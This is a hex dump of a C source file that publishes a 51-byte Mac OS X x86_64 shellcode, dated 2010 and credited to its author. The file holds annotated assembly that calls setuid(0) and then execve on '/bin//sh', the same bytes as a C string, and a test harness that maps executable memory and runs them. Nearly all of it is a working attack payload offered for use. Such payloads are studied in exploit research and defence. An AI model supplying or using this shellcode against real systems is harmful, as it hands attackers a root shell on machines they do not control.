00000000  2f 2a 0d 0a 20 2a 20 54  69 74 6c 65 3a 20 20 20  |/*.. * Title:   |
00000010  20 20 4f 53 58 2f 49 6e  74 65 6c 20 2d 20 73 65  |  OSX/Intel - se|
00000020  74 75 69 64 20 73 68 65  6c 6c 20 78 38 36 5f 36  |tuid shell x86_6|
00000030  34 20 2d 20 35 31 20 62  79 74 65 73 0d 0a 20 2a  |4 - 51 bytes.. *|
00000040  20 44 61 74 65 3a 20 20  20 20 20 20 32 30 31 30  | Date:      2010|
00000050  2d 31 31 2d 32 35 0d 0a  20 2a 20 54 65 73 74 65  |-11-25.. * Teste|
00000060  64 20 6f 6e 3a 20 4d 61  63 20 4f 53 20 58 20 31  |d on: Mac OS X 1|
00000070  30 2e 36 2e 35 20 2d 20  44 61 72 77 69 6e 20 4b  |0.6.5 - Darwin K|
00000080  65 72 6e 65 6c 20 56 65  72 73 69 6f 6e 20 31 30  |ernel Version 10|
00000090  2e 35 2e 30 0d 0a 20 2a  20 41 75 74 68 6f 72 3a  |.5.0.. * Author:|
000000a0  20 20 20 20 44 75 73 74  69 6e 20 53 63 68 75 6c  |    Dustin Schul|
000000b0  74 7a 20 2d 20 74 77 69  74 74 65 72 3a 20 40 74  |tz - twitter: @t|
000000c0  68 65 78 70 6c 6f 69 74  0d 0a 20 2a 0d 0a 20 2a  |hexploit.. *.. *|
000000d0  20 68 74 74 70 3a 2f 2f  74 68 65 78 70 6c 6f 69  | http://thexploi|
000000e0  74 2e 63 6f 6d 0d 0a 20  2a 0d 0a 20 2a 20 42 49  |t.com.. *.. * BI|
000000f0  54 53 20 36 34 0d 0a 20  2a 0d 0a 20 2a 20 73 65  |TS 64.. *.. * se|
00000100  63 74 69 6f 6e 20 2e 74  65 78 74 0d 0a 20 2a 20  |ction .text.. * |
00000110  67 6c 6f 62 61 6c 20 73  74 61 72 74 0d 0a 20 2a  |global start.. *|
00000120  0d 0a 20 2a 20 73 74 61  72 74 3a 0d 0a 20 2a 20  |.. * start:.. * |
00000130  61 3a 0d 0a 20 2a 20 20  6d 6f 76 20 72 38 62 2c  |a:.. *  mov r8b,|
00000140  20 30 78 30 32 20 20 20  20 20 20 20 20 20 20 3b  | 0x02          ;|
00000150  20 55 6e 69 78 20 63 6c  61 73 73 20 73 79 73 74  | Unix class syst|
00000160  65 6d 20 63 61 6c 6c 73  20 3d 20 32 0d 0a 20 2a  |em calls = 2.. *|
00000170  20 20 73 68 6c 20 72 38  2c 20 32 34 20 20 20 20  |  shl r8, 24    |
00000180  20 20 20 20 20 20 20 20  20 3b 20 73 68 69 66 74  |         ; shift|
00000190  20 6c 65 66 74 20 32 34  20 74 6f 20 74 68 65 20  | left 24 to the |
000001a0  75 70 70 65 72 20 6f 72  64 65 72 20 62 69 74 73  |upper order bits|
000001b0  0d 0a 20 2a 20 20 6f 72  20 72 38 2c 20 30 78 31  |.. *  or r8, 0x1|
000001c0  37 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |7            ; s|
000001d0  65 74 75 69 64 20 3d 20  32 33 2c 20 6f 72 20 77  |etuid = 23, or w|
000001e0  69 74 68 20 63 6c 61 73  73 20 3d 20 30 78 32 30  |ith class = 0x20|
000001f0  30 30 30 31 37 0d 0a 20  2a 20 20 78 6f 72 20 65  |00017.. *  xor e|
00000200  64 69 2c 20 65 64 69 20  20 20 20 20 20 20 20 20  |di, edi         |
00000210  20 20 3b 20 7a 65 72 6f  20 6f 75 74 20 65 64 69  |  ; zero out edi|
00000220  0d 0a 20 2a 20 20 6d 6f  76 20 72 61 78 2c 20 72  |.. *  mov rax, r|
00000230  38 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |8            ; s|
00000240  79 73 63 61 6c 6c 20 6e  75 6d 62 65 72 20 69 6e  |yscall number in|
00000250  20 72 61 78 0d 0a 20 2a  20 20 73 79 73 63 61 6c  | rax.. *  syscal|
00000260  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |l               |
00000270  20 3b 20 69 6e 76 6f 6b  65 20 6b 65 72 6e 65 6c  | ; invoke kernel|
00000280  0d 0a 20 2a 20 20 6a 6d  70 20 73 68 6f 72 74 20  |.. *  jmp short |
00000290  63 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 6a  |c            ; j|
000002a0  75 6d 70 20 74 6f 20 63  0d 0a 20 2a 20 62 3a 0d  |ump to c.. * b:.|
000002b0  0a 20 2a 20 20 70 6f 70  20 72 64 69 20 20 20 20  |. *  pop rdi    |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 70 6f  |            ; po|
000002d0  70 20 72 65 74 20 61 64  64 72 20 77 68 69 63 68  |p ret addr which|
000002e0  20 3d 20 61 64 64 72 20  6f 66 20 2f 62 69 6e 2f  | = addr of /bin/|
000002f0  73 68 0d 0a 20 2a 20 20  61 64 64 20 72 38 2c 20  |sh.. *  add r8, |
00000300  30 78 32 34 20 20 20 20  20 20 20 20 20 20 20 3b  |0x24           ;|
00000310  20 65 78 65 63 76 65 20  3d 20 35 39 2c 20 30 78  | execve = 59, 0x|
00000320  32 34 2b 72 38 3d 30 78  32 30 30 30 30 33 62 0d  |24+r8=0x200003b.|
00000330  0a 20 2a 20 20 6d 6f 76  20 72 61 78 2c 20 72 38  |. *  mov rax, r8|
00000340  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 73 79  |            ; sy|
00000350  73 63 61 6c 6c 20 6e 75  6d 62 65 72 20 69 6e 20  |scall number in |
00000360  72 61 78 0d 0a 20 2a 20  20 78 6f 72 20 72 64 78  |rax.. *  xor rdx|
00000370  2c 20 72 64 78 20 20 20  20 20 20 20 20 20 20 20  |, rdx           |
00000380  3b 20 7a 65 72 6f 20 6f  75 74 20 72 64 78 0d 0a  |; zero out rdx..|
00000390  20 2a 20 20 70 75 73 68  20 72 64 78 20 20 20 20  | *  push rdx    |
000003a0  20 20 20 20 20 20 20 20  20 20 20 3b 20 6e 75 6c  |           ; nul|
000003b0  6c 20 74 65 72 6d 69 6e  61 74 65 20 72 64 69 2c  |l terminate rdi,|
000003c0  20 70 75 73 68 65 64 20  62 61 63 6b 77 61 72 64  | pushed backward|
000003d0  73 0d 0a 20 2a 20 20 70  75 73 68 20 72 64 69 20  |s.. *  push rdi |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000003f0  70 75 73 68 20 72 64 69  20 3d 20 70 6f 69 6e 74  |push rdi = point|
00000400  65 72 20 74 6f 20 2f 62  69 6e 2f 73 68 0d 0a 20  |er to /bin/sh.. |
00000410  2a 20 20 6d 6f 76 20 72  73 69 2c 20 72 73 70 20  |*  mov rsi, rsp |
00000420  20 20 20 20 20 20 20 20  20 20 3b 20 70 6f 69 6e  |          ; poin|
00000430  74 65 72 20 74 6f 20 6e  75 6c 6c 20 74 65 72 6d  |ter to null term|
00000440  69 6e 61 74 65 64 20 2f  62 69 6e 2f 73 68 20 73  |inated /bin/sh s|
00000450  74 72 69 6e 67 0d 0a 20  2a 20 20 73 79 73 63 61  |tring.. *  sysca|
00000460  6c 6c 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ll              |
00000470  20 20 3b 20 69 6e 76 6f  6b 65 20 74 68 65 20 6b  |  ; invoke the k|
00000480  65 72 6e 65 6c 0d 0a 20  2a 20 63 3a 0d 0a 20 2a  |ernel.. * c:.. *|
00000490  20 20 63 61 6c 6c 20 62  20 20 20 20 20 20 20 20  |  call b        |
000004a0  20 20 20 20 20 20 20 20  20 3b 20 63 61 6c 6c 20  |         ; call |
000004b0  62 2c 20 70 75 73 68 20  72 65 74 20 6f 66 20 2f  |b, push ret of /|
000004c0  62 69 6e 2f 73 68 0d 0a  20 2a 20 20 64 62 20 27  |bin/sh.. *  db '|
000004d0  2f 62 69 6e 2f 2f 73 68  27 20 20 20 20 20 20 20  |/bin//sh'       |
000004e0  20 20 20 3b 20 2f 62 69  6e 2f 73 68 20 73 74 72  |   ; /bin/sh str|
000004f0  69 6e 67 0d 0a 2a 2f 0d  0a 20 0d 0a 20 0d 0a 23  |ing..*/.. .. ..#|
00000500  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000510  3e 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 79 73  |>..#include <sys|
00000520  2f 6d 6d 61 6e 2e 68 3e  0d 0a 23 69 6e 63 6c 75  |/mman.h>..#inclu|
00000530  64 65 20 3c 73 74 72 69  6e 67 2e 68 3e 0d 0a 23  |de <string.h>..#|
00000540  69 6e 63 6c 75 64 65 20  3c 73 74 64 6c 69 62 2e  |include <stdlib.|
00000550  68 3e 0d 0a 20 0d 0a 69  6e 74 20 28 2a 73 63 29  |h>.. ..int (*sc)|
00000560  28 29 3b 0d 0a 20 0d 0a  63 68 61 72 20 73 68 65  |();.. ..char she|
00000570  6c 6c 63 6f 64 65 5b 5d  20 3d 0d 0a 22 5c 78 34  |llcode[] =.."\x4|
00000580  31 5c 78 62 30 5c 78 30  32 5c 78 34 39 5c 78 63  |1\xb0\x02\x49\xc|
00000590  31 5c 78 65 30 5c 78 31  38 5c 78 34 39 5c 78 38  |1\xe0\x18\x49\x8|
000005a0  33 5c 78 63 38 5c 78 31  37 5c 78 33 31 5c 78 66  |3\xc8\x17\x31\xf|
000005b0  66 5c 78 34 63 5c 78 38  39 5c 78 63 30 22 0d 0a  |f\x4c\x89\xc0"..|
000005c0  22 5c 78 30 66 5c 78 30  35 5c 78 65 62 5c 78 31  |"\x0f\x05\xeb\x1|
000005d0  32 5c 78 35 66 5c 78 34  39 5c 78 38 33 5c 78 63  |2\x5f\x49\x83\xc|
000005e0  30 5c 78 32 34 5c 78 34  63 5c 78 38 39 5c 78 63  |0\x24\x4c\x89\xc|
000005f0  30 5c 78 34 38 5c 78 33  31 5c 78 64 32 5c 78 35  |0\x48\x31\xd2\x5|
00000600  32 22 0d 0a 22 5c 78 35  37 5c 78 34 38 5c 78 38  |2".."\x57\x48\x8|
00000610  39 5c 78 65 36 5c 78 30  66 5c 78 30 35 5c 78 65  |9\xe6\x0f\x05\xe|
00000620  38 5c 78 65 39 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xe9\xff\xff\xf|
00000630  66 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |f\x2f\x62\x69\x6|
00000640  65 5c 78 32 66 22 0d 0a  22 5c 78 32 66 5c 78 37  |e\x2f".."\x2f\x7|
00000650  33 5c 78 36 38 22 3b 0d  0a 20 0d 0a 69 6e 74 20  |3\x68";.. ..int |
00000660  6d 61 69 6e 28 69 6e 74  20 61 72 67 63 2c 20 63  |main(int argc, c|
00000670  68 61 72 20 2a 2a 61 72  67 76 29 20 7b 0d 0a 20  |har **argv) {.. |
00000680  0d 0a 20 20 20 20 76 6f  69 64 20 2a 70 74 72 20  |..    void *ptr |
00000690  3d 20 6d 6d 61 70 28 30  2c 20 30 78 33 33 2c 20  |= mmap(0, 0x33, |
000006a0  50 52 4f 54 5f 45 58 45  43 20 7c 20 50 52 4f 54  |PROT_EXEC | PROT|
000006b0  5f 57 52 49 54 45 20 7c  20 50 52 4f 54 5f 52 45  |_WRITE | PROT_RE|
000006c0  41 44 2c 20 4d 41 50 5f  41 4e 4f 4e 0d 0a 20 20  |AD, MAP_ANON..  |
000006d0  20 20 20 20 20 20 20 20  20 20 7c 20 4d 41 50 5f  |          | MAP_|
000006e0  50 52 49 56 41 54 45 2c  20 2d 31 2c 20 30 29 3b  |PRIVATE, -1, 0);|
000006f0  0d 0a 20 0d 0a 20 20 20  20 69 66 20 28 70 74 72  |.. ..    if (ptr|
00000700  20 3d 3d 20 4d 41 50 5f  46 41 49 4c 45 44 29 20  | == MAP_FAILED) |
00000710  7b 0d 0a 20 20 20 20 20  20 20 20 70 65 72 72 6f  |{..        perro|
00000720  72 28 22 6d 6d 61 70 22  29 3b 0d 0a 20 20 20 20  |r("mmap");..    |
00000730  20 20 20 20 65 78 69 74  28 2d 31 29 3b 0d 0a 20  |    exit(-1);.. |
00000740  20 20 20 7d 0d 0a 20 0d  0a 20 20 20 20 6d 65 6d  |   }.. ..    mem|
00000750  63 70 79 28 70 74 72 2c  20 73 68 65 6c 6c 63 6f  |cpy(ptr, shellco|
00000760  64 65 2c 20 73 69 7a 65  6f 66 28 73 68 65 6c 6c  |de, sizeof(shell|
00000770  63 6f 64 65 29 29 3b 0d  0a 20 20 20 20 73 63 20  |code));..    sc |
00000780  3d 20 70 74 72 3b 0d 0a  20 0d 0a 20 20 20 20 73  |= ptr;.. ..    s|
00000790  63 28 29 3b 0d 0a 20 0d  0a 20 20 20 20 72 65 74  |c();.. ..    ret|
000007a0  75 72 6e 20 30 3b 0d 0a  7d                       |urn 0;..}|
000007a9
